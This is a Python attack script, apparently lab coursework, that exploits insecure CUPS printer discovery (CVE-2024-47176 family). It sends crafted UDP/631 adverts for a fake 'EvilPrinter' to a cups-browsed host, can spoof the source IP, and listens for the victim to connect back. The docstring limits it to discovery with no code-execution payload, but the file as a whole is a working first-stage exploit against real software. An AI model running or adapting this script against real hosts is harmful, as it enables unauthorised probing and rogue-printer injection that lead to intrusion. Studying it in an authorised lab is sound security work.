#!/usr/bin/env python3
"""
cups_attack.py - Insecure CUPS printer-discovery demonstration (DAT505).

Advertises an attacker-controlled virtual printer to a victim running
cups-browsed (UDP/631) and checks whether the victim calls back to the
advertised address - proving discovery is trusted without authentication
(CVE-2024-47176 family). Scoped to discovery only; no RCE payload.

Authorised lab use only. Raw send / source spoofing need root.
"""

import argparse
import logging
import socket
import threading
import time

from scapy.all import IP, UDP, Raw, send, wrpcap, conf

CUPS_PORT = 631
log = logging.getLogger("cups_attack")


def build_packet(target, listen_ip, listen_port, fields, src_ip, dport):
    """Craft the UDP/631 discovery packet carrying the fake-printer advert."""
    uri = f"{fields['scheme']}://{listen_ip}:{listen_port}/printers/{fields['name']}"
    # Legacy CUPS browse datagram: <type> <state> <uri> "<loc>" "<info>" "<model>"
    payload = (
        f'{fields["type"]:x} {fields["state"]:x} {uri} '
        f'"{fields["location"]}" "{fields["info"]}" "{fields["model"]}"'
    ).encode()

    ip = IP(dst=target)
    if src_ip:                      # spoofed origin: discovery does not verify it
        ip.src = src_ip
    pkt = ip / UDP(sport=CUPS_PORT, dport=dport) / Raw(load=payload)
    log.debug("advert URI: %s", uri)
    log.debug("payload   : %r", payload)
    return pkt


def wait_for_callback(listen_port, timeout, result):
    """Listen on the advertised port; an inbound connection proves the callback."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", listen_port))
        srv.listen(1)
        srv.settimeout(timeout)
        log.info("Listening on 0.0.0.0:%d for callback (%.0fs)...", listen_port, timeout)
        conn, peer = srv.accept()
    except socket.timeout:
        log.warning("No callback - victim did not connect (patched/filtered?).")
        return
    except OSError as e:
        log.error("Listener error: %s", e)
        return

    result["peer"] = peer
    log.info("*** CALLBACK from %s:%d - insecure discovery confirmed ***", *peer)
    try:
        data = conn.recv(1024)
        log.info("Victim sent %d bytes of IPP/HTTP request", len(data))
        conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")  # benign reply
    except OSError:
        pass
    finally:
        conn.close()
        srv.close()


# Arguments 
p = argparse.ArgumentParser(description="Insecure CUPS printer-discovery demo (DAT505).")
p.add_argument("--target", default="172.18.0.2", help="Victim IP running cups-browsed")
p.add_argument("--listen-ip", default="172.18.0.1", help="IP to advertise as the printer host (Kali)")
p.add_argument("--listen-port", type=int, default=9100, help="Advertised + callback port")
p.add_argument("--dport", type=int, default=CUPS_PORT, help="Victim UDP port")
p.add_argument("--src-ip", help="Spoof the source IP (needs root)")
p.add_argument("--scheme", default="ipp", choices=["ipp", "ipps", "http", "https"])
p.add_argument("--name", default="EvilPrinter", help="Advertised queue name")
p.add_argument("--location", default="Lab")
p.add_argument("--info", default="Free High-Speed Printer")
p.add_argument("--model", default="Generic PostScript Printer")
p.add_argument("--type", type=lambda x: int(x, 0), default=0x1000006, help="Browse type flags")
p.add_argument("--state", type=int, default=3, help="3=idle,4=processing,5=stopped")
p.add_argument("--count", type=int, default=1, help="Number of adverts to send")
p.add_argument("--interval", type=float, default=0.5, help="Seconds between adverts")
p.add_argument("--wait", type=float, default=15.0, help="Seconds to wait for callback")
p.add_argument("--no-listen", action="store_true", help="Send only, no callback listener")
p.add_argument("--dry-run", action="store_true", help="Build/save packet, send nothing")
p.add_argument("--pcap", help="Write crafted packet(s) to this PCAP file")
p.add_argument("-v", "--verbose", action="store_true")
args = p.parse_args()

logging.basicConfig(
    level=logging.DEBUG if args.verbose else logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S",
)
conf.verb = 0

# Build advert packet(s) 
fields = {k: getattr(args, k) for k in
          ("scheme", "name", "location", "info", "model", "type", "state")}
pkt = build_packet(args.target, args.listen_ip, args.listen_port,
                   fields, args.src_ip, args.dport)
packets = [pkt] * args.count

log.info("Target %s:%d/udp  ->  advertising %s://%s:%d/printers/%s",
         args.target, args.dport, args.scheme, args.listen_ip, args.listen_port, args.name)

if args.pcap:
    wrpcap(args.pcap, packets)
    log.info("Saved %d packet(s) to %s", len(packets), args.pcap)

# Send and observe 
if args.dry_run:
    log.info("Dry run - nothing sent. %s", pkt.summary())
else:
    result = {}
    listener = None
    if not args.no_listen:
        listener = threading.Thread(
            target=wait_for_callback,
            args=(args.listen_port, args.wait, result), daemon=True)
        listener.start()
        time.sleep(0.3)

    log.info("Sending %d discovery packet(s)...", args.count)
    send(packets, inter=args.interval, verbose=False)

    if listener:
        listener.join(args.wait + 5)
        if not result:
            log.info("Result: no callback observed.")
